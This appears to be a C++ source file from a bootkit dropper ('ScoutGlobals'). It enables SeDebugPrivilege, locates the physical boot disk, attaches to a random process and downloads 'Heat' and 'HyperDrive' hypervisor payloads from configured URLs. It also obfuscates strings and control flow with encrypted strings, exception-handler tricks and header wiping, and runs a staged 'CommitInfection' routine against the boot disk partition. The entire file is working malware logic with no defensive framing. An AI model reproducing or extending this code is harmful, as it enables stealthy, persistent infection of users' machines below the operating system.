	fnIsWow64Process Iswow64Process = Globals->FunctionPointers->IsWow64Process;

	Globals->Is64Bit = FALSE;

	if (IsWow64Process != 0){
		BOOL Is64Bit = FALSE;

		if (!IsWow64Process((HANDLE)-1, &Is64Bit)){
			DebugPrint("Unable to detect bitness\r\n");
			goto ExitPoint;
		}

		Globals->Is64Bit = Is64Bit;

		DebugPrint("Is64Bit: %s\r\n", Globals->Is64Bit == TRUE ? "Yes" : "No");
	}

	Status = TRUE;

ExitPoint:
	return Status;
};
BOOLEAN STDCALL pGetBootDisk(){
	BOOLEAN Status = FALSE;
	PWCHAR pBootDisk = NULL;
	WCHAR ArcNameBuffer[44];
	ULONG ArcNameLength = 43 * sizeof(WCHAR);
	LSTATUS ErrorCode = 0;
	PWCHAR ptr = NULL;
	PWCHAR ptr2 = NULL;
	UCHAR nlen = 0;
	UCHAR DriveNumber = 0;
	PFUNCTION_POINTER_BLOCK Fp = Globals->FunctionPointers;

	PWCHAR PhyDriveFormat = PreKeyedEncryptedStringW(L"\\??\\PhysicalDrive%d");
	PWCHAR ControlReg = PreKeyedEncryptedStringW(L"SYSTEM\\CurrentControlSet\\Control");
	PWCHAR SysBootDevice = PreKeyedEncryptedStringW(L"SystemBootDevice");
	PWCHAR Rdisk = PreKeyedEncryptedStringW(L"rdisk");

	// query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SystemBootDevice
	// this will give us the name of an ArcName object
	// ex: "multi(0)disk(0)rdisk(0)partition(3)"
	// parse it for it's rdisk field
	// rdisk field will tell us the # of the sda that was used to boot

	

	Utils::memset(ArcNameBuffer, 0, 44 * sizeof(WCHAR));

	if ((ErrorCode = Fp->RegGetValueW(HKEY_LOCAL_MACHINE, ControlReg, SysBootDevice, RRF_RT_ANY, NULL, ArcNameBuffer, &ArcNameLength)) != ERROR_SUCCESS){
		DebugPrint("Unable to query SystemBootDevice from registry: %d\r\n", ErrorCode);
		goto ExitPoint;
	}

	DebugPrint("Boot device ArcName: %ws\r\n", ArcNameBuffer);

	ptr = ArcNameBuffer;
	while (wcsncmp(ptr++, Rdisk, 5));
	ptr += 5;
	ptr2 = ptr;
	while (*ptr2++ != L')');
	ptr2--;

	nlen = (UCHAR)(ptr2 - ptr);
	*ptr2 = 0;

	DriveNumber = (UCHAR)std::wcstoul(ptr, NULL, 10);
	DebugPrint("Boot drive number: %d\r\n", DriveNumber);

	pBootDisk = (PWCHAR)Fp->VirtualAlloc(NULL, sizeof(WCHAR) * 21, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pBootDisk == NULL)
		goto ExitPoint;

	_snwprintf_s(pBootDisk, 21, 20, PhyDriveFormat, DriveNumber);

	DebugPrint("Boot disk: %ws\r\n", pBootDisk);

	Globals->BootDisk = pBootDisk;

	Status = TRUE;

ExitPoint:
	return Status;
};
BOOLEAN STDCALL pAllocateFileSystem(){
	BOOLEAN Status = FALSE;
	PFS_INFO FsInfo = NULL;
	HeatFileSystem *Fs = NULL;

	FsInfo = (PFS_INFO)Globals->FunctionPointers->VirtualAlloc(NULL, sizeof(FS_INFO), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (FsInfo == NULL)
		goto ExitPoint;

	Fs = new HeatFileSystem(Globals->BootDisk, Globals->FunctionPointers);
	if (Fs == NULL)
		goto ExitPoint;

	FsInfo->FileSystem = Fs;
	Globals->FsInfo = FsInfo;

	DebugPrint("ALLOC FS SUCCESS\r\n");

	Status = TRUE;

ExitPoint:
	return Status;
};
BOOLEAN STDCALL pBuildNetworkBlock() {
	bool NetworkActive = false;

	Globals->NetworkBlock = new StealthNetwork(&NetworkActive);
	Globals->NetworkActive = !!NetworkActive;

	if (!NetworkActive)
		goto ExitPoint;


	return TRUE;

ExitPoint:
	return FALSE;
};
BOOLEAN STDCALL pDownloadComponents(){
	PCONFIG Config = Globals->Config;
	StealthNetwork *Network = Globals->NetworkBlock;

	DebugPrint("Downloading Components...\r\n");
	DebugPrint("Heat32 URL: %s\r\n", Config->Heat32Url);
	DebugPrint("Heat64 URL: %s\r\n", Config->Heat64Url);
	DebugPrint("HyperDrive32 URL: %s\r\n", Config->HyperDrive32Url);
	DebugPrint("HyperDrive64 URL: %s\r\n", Config->HyperDrive64Url);

	if (!Globals->NetworkActive)
		goto ExitPoint;
	
	if (!AttachToRandomProcess(Network))
		goto ExitPoint;

	DebugPrint("Attaching to process\r\n");

	if (Globals->Is64Bit) {
		Network->PerformHttpGet((LPCSTR)Config->Heat64Url, (PUCHAR*)&Globals->HeatBase, &Globals->HeatSize);
		Network->PerformHttpGet((LPCSTR)Config->HyperDrive64Url, (PUCHAR*)&Globals->HypervisorBase, &Globals->HypervisorSize);

		*(PUCHAR*)&Globals->HeatBase += Utils::FindOccurrence((PCHAR)Globals->HeatBase, Globals->HeatSize, "\r\n\r\n");
		*(PUCHAR*)&Globals->HypervisorBase += Utils::FindOccurrence((PCHAR)Globals->HypervisorBase, Globals->HypervisorSize, "\r\n\r\n");

	}
	else
	{
		Network->PerformHttpGet((LPCSTR)Config->Heat32Url, (PUCHAR*)&Globals->HeatBase, &Globals->HeatSize);
		Network->PerformHttpGet((LPCSTR)Config->HyperDrive32Url, (PUCHAR*)&Globals->HypervisorBase, &Globals->HypervisorSize);

		*(PUCHAR*)&Globals->HeatBase += Utils::FindOccurrence((PCHAR)Globals->HeatBase, Globals->HeatSize, "\r\n\r\n");
		*(PUCHAR*)&Globals->HypervisorBase += Utils::FindOccurrence((PCHAR)Globals->HypervisorBase, Globals->HypervisorSize, "\r\n\r\n");

		DebugPrint("Heat:\r\n%s\r\n", Globals->HeatBase);
	}

	// todo: decrypt Heat and Hyperdrive


	return TRUE;

ExitPoint:
	return FALSE;
};
BOOLEAN STDCALL pTeardownNetworkBlock() {
	if (Globals->NetworkBlock == NULL)
		return FALSE;

	delete Globals->NetworkBlock;
	return TRUE;
};
BOOLEAN STDCALL pDestroyHeaders(){
	PFUNCTION_POINTER_BLOCK Fp = Globals->FunctionPointers;
	ULONG OldProtection = 0;

	if (!Fp->VirtualProtect(&__ImageBase, sizeof(IMAGE_DOS_HEADER), PAGE_READWRITE, &OldProtection))
		goto ExitPoint;

//	memset(&__ImageBase, 0, sizeof(IMAGE_DOS_HEADER)); // for now
	DebugPrint("CLEARED DOS HEADER\r\n");

	Fp->VirtualProtect(&__ImageBase, sizeof(IMAGE_DOS_HEADER), OldProtection, &OldProtection);

	return TRUE;

ExitPoint:
	return FALSE;
};
BOOLEAN STDCALL pAdjustTokens() {
	BOOLEAN Status = FALSE;
	PFUNCTION_POINTER_BLOCK Fp = Globals->FunctionPointers;
	HANDLE TokenHandle = NULL;
	TOKEN_PRIVILEGES NewState = { 0 };
	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


	if (!Fp->OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &TokenHandle))
		goto ExitPoint;

	DebugPrint("Opened process token\r\n");

	if (!Fp->LookupPrivilegeValueW(NULL, PreKeyedEncryptedStringW(L"SeDebugPrivilege"), &NewState.Privileges[0].Luid))
		goto ExitPoint;
	
	DebugPrint("Looked up SeDebugPrivilege: %llx\r\n", ((ULONGLONG)NewState.Privileges[0].Luid.HighPart << 32) + NewState.Privileges[0].Luid.LowPart);

	if (!Fp->AdjustTokenPrivileges(TokenHandle, FALSE, &NewState, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
		goto ExitPoint;

	DebugPrint("Granted SeDebugPrivilege\r\n");

	Status = TRUE;

ExitPoint:
	if (TokenHandle != NULL)
		Fp->CloseHandle(TokenHandle);

	return Status;
};



#pragma endregion

MetaBlockCall *ScoutGlobals::SwitchBlockCall() {
	MetaBlockCall *BlockCall = NULL;

	switch (this->BlockCallCounter++) {
	case 0: { BlockCall = this->DecryptSelf; break; }
	case 1: { BlockCall = this->ResolveFunctionPointers; break; }
	case 2: { BlockCall = this->AdjustTokens; break; }
	case 3: { BlockCall = this->UnpackConfig; break; }
	case 4: { BlockCall = this->DestroyHeaders; break; }
	case 5: { BlockCall = this->CheckBitness; break; }
	case 6: { BlockCall = this->RetrieveBootDisk; break; }
	case 7: { BlockCall = this->AllocateFileSystem; break; }
	case 8: { BlockCall = this->CheckIfUefi; break; }
	case 9: { BlockCall = this->BuildNetworkBlock; break; }
	case 10: { BlockCall = this->DownloadComponents; break; }
	case 11: { BlockCall = this->TeardownNetworkBlock; break; }
	case 12: { BlockCall = this->BeginPartitionFileSystem; break; }
	case 13: { BlockCall = this->CommitInfection; break; }
	case 14: { BlockCall = this->CompletePartitionFileSystem; break; }
	default:
		break;
	}


   return BlockCall;
};
ScoutGlobals::ScoutGlobals(std::function<void()> *LambdaOut) {
	this->K32 = new ModuleResolver(0x1133596d);
	this->NtDll = new ModuleResolver(0x62c94aee);

	this->TransientDebugFlag = FALSE;
	this->BlockCallCounter = 0;

	if (!AllocateFunctionPointers(this))
		throw ".";

	this->ExceptionHandlerHandle = this->FunctionPointers->RtlAddVectoredExceptionHandler(TRUE, TransientDebugHandler);
	if (this->ExceptionHandlerHandle == NULL)
		throw ".";

	this->LoaderConfig = new LOADER_CONFIG();

	*LambdaOut = [this](){
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->ResolveFunctionPointers = new MetaBlockCall((unsigned long)pResolveFunctions);
		TRANSIENT_DISABLE_DEBUG;
		this->UnpackConfig = new MetaBlockCall((unsigned long)pUnpackConfig);
		TRANSIENT_DISABLE_DEBUG;
		this->RetrieveBootDisk = new MetaBlockCall((unsigned long)pGetBootDisk);
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->AdjustTokens = new MetaBlockCall((unsigned long)pAdjustTokens);
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->TeardownNetworkBlock = new MetaBlockCall((unsigned long)pTeardownNetworkBlock);
		TRANSIENT_DISABLE_DEBUG;
		this->DecryptSelf = new MetaBlockCall((unsigned long)pDecryptSelf);
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->BeginPartitionFileSystem = new MetaBlockCall((unsigned long)pBeginPartitionFileSystem);
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->CheckBitness = new MetaBlockCall((unsigned long)pGetIs64Bit);
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->CompletePartitionFileSystem = new MetaBlockCall((unsigned long)pCompletePartitionFileSystem);
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->CheckIfUefi = new MetaBlockCall((unsigned long)pGetIsUefi);
		TRANSIENT_DISABLE_DEBUG;
		this->DestroyHeaders = new MetaBlockCall((unsigned long)pDestroyHeaders);
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->BuildNetworkBlock = new MetaBlockCall((unsigned long)pBuildNetworkBlock);
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->CommitInfection = new MetaBlockCall((unsigned long)pCommitInfection);
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->AllocateFileSystem = new MetaBlockCall((unsigned long)pAllocateFileSystem);
		TRANSIENT_DISABLE_DEBUG;
		this->CallStubInfo = (PCALL_STUB)this->FunctionPointers->VirtualAlloc(NULL, sizeof(CALL_STUB), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		TRANSIENT_DISABLE_DEBUG;
		if (this->CallStubInfo == NULL) {
			TRANSIENT_DISABLE_DEBUG;
			TRANSIENT_DISABLE_DEBUG;
			throw ".";
		}
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		this->DownloadComponents = new MetaBlockCall((unsigned long)pDownloadComponents);
		TRANSIENT_DISABLE_DEBUG;
		this->CallStubInfo->CallStub[0] = 0xe8; // call rel32
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;
		*(USHORT*)&this->CallStubInfo->CallStub[5] = 0x0b0f; // ud2
		TRANSIENT_DISABLE_DEBUG;
		this->CallStubInfo->CallOperandPointer = (PULONG)&this->CallStubInfo->CallStub[1];
		TRANSIENT_DISABLE_DEBUG;
		TRANSIENT_DISABLE_DEBUG;

		this->TransientDebugFlag = TRUE;
	};
};


int __cdecl wmain(){
	std::function<void()> Continue;
	Globals = new ScoutGlobals(&Continue); // Bootstraps

	/*
		todo: add cpu red pills to detect emulation here
	*/


	Continue();

	TRANSIENT_DISABLE_DEBUG; // DECOMPRESS SELF
	TRANSIENT_DISABLE_DEBUG; // RESOLVE FUNCTIONS
	TRANSIENT_DISABLE_DEBUG; // ADJUST TOKENS
	TRANSIENT_DISABLE_DEBUG; // UNPACK CONFIG
	TRANSIENT_DISABLE_DEBUG; // DESTROY HEADERS
	TRANSIENT_DISABLE_DEBUG; // CHECK BITNESS
	TRANSIENT_DISABLE_DEBUG; // RETRIEVE BOOT DISK
	TRANSIENT_DISABLE_DEBUG; // ALLOCATE FILE SYSTEM
	TRANSIENT_DISABLE_DEBUG; // CHECK IF UEFI
	TRANSIENT_DISABLE_DEBUG; // BUILD NETWORK BLOCK
	TRANSIENT_DISABLE_DEBUG; // DOWNLOAD COMPONENTS
	TRANSIENT_DISABLE_DEBUG; // TEARDOWN NETWORK BLOCK
	TRANSIENT_DISABLE_DEBUG; // BEGIN PARTITION FILE SYSTEM
	TRANSIENT_DISABLE_DEBUG; // COMMIT INFECTION
	TRANSIENT_DISABLE_DEBUG; // COMPLETE PARTITION FILE SYSTEM

	Globals->TransientDebugFlag = FALSE;
	Globals->FunctionPointers->VirtualFree(Globals->CallStubInfo, 0, MEM_RELEASE);

//ExitPoint:
	PauseExecution();
	return 0;
};
